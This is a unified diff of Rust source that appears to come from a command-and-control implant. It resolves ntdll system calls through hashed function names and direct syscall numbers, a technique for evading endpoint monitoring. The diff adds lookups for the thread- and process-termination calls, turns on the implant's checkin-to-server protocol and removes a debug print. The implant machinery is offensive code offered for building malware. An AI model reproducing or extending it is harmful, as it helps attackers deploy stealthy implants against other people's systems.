@@ -22,10 +22,12 @@ use rs2_communication_protocol::{
 use rs2_communication_protocol::{
     communication_structs::checkin::{Checkin, PartialCheckin},
     metadata::Metadata,
-    // sender::Sender,
+    sender::Sender,
 };
 
 use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
+
+use crate::commands::{encryptor_from_raw, protocol_from_raw};
 
 /// Initializes the global instance by setting up necessary system call addresses and session data.
 pub unsafe fn init_global_instance() {
@@ -33,6 +35,10 @@ pub unsafe fn init_global_instance() {
     const NTDLL_HASH: u32 = 0x1edab0ed;
     const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
     const NT_FREE_VIRTUAL_MEMORY: usize = 0x2802c609;
+
+    const NT_TERMINATE_THREAD: usize = 0xccf58808;
+    const NT_TERMINATE_PROCESS: usize = 0x4ed9dd4f;
+
     const NT_CLOSE: usize = 0x40d6e69d;
     const NT_OPEN_KEY: usize = 0x7682ed42;
     const NT_QUERY_VALUE_KEY: usize = 0x85967123;
@@ -58,6 +64,18 @@ pub unsafe fn init_global_instance() {
         ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY);
     instance.ntdll.nt_free_virtual_memory.syscall.number =
         get_syscall_number(instance.ntdll.nt_free_virtual_memory.syscall.address);
+
+    // NtTerminateThread
+    instance.ntdll.nt_terminate_thread.syscall.address =
+        ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_THREAD);
+    instance.ntdll.nt_terminate_thread.syscall.number =
+        get_syscall_number(instance.ntdll.nt_terminate_thread.syscall.address);
+
+    // NtTerminateProcess
+    instance.ntdll.nt_terminate_process.syscall.address =
+        ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_PROCESS);
+    instance.ntdll.nt_terminate_process.syscall.number =
+        get_syscall_number(instance.ntdll.nt_terminate_process.syscall.address);
 
     // NtClose
     instance.ntdll.nt_close.syscall.address =
@@ -205,7 +223,6 @@ pub async fn init_protocol() {
 
         unsafe {
             let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
-
             let protocol = protocol_from_raw(instance().session.protocol_ptr);
 
             // Check if the Checkin data is available in the global instance
@@ -213,9 +230,8 @@ pub async fn init_protocol() {
                 // Convert the raw pointer to a mutable reference to Checkin
                 let checkin_data = checkin_from_raw(checkin_ptr);
 
-                libc_println!("{}", serde_json::to_string_pretty(&checkin_data).unwrap());
                 // Set the protocol to checkin mode
-                // protocol.set_is_checkin(true);
+                protocol.set_is_checkin(true);
 
                 // Attempt to write the Checkin data using the protocol
                 let result = protocol
@@ -260,16 +276,4 @@ pub async fn init_protocol() {
 /// Function to retrieve a mutable reference to a Checkin struct from a raw pointer.
 pub unsafe fn checkin_from_raw(ptr: *mut c_void) -> &'static mut Checkin {
     &mut *(ptr as *mut Checkin)
-}
-
-#[cfg(feature = "protocol-json")]
-/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
-pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
-    &mut *(ptr as *mut IdentEncryptor)
-}
-
-#[cfg(feature = "protocol-json")]
-/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
-pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
-    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
 }
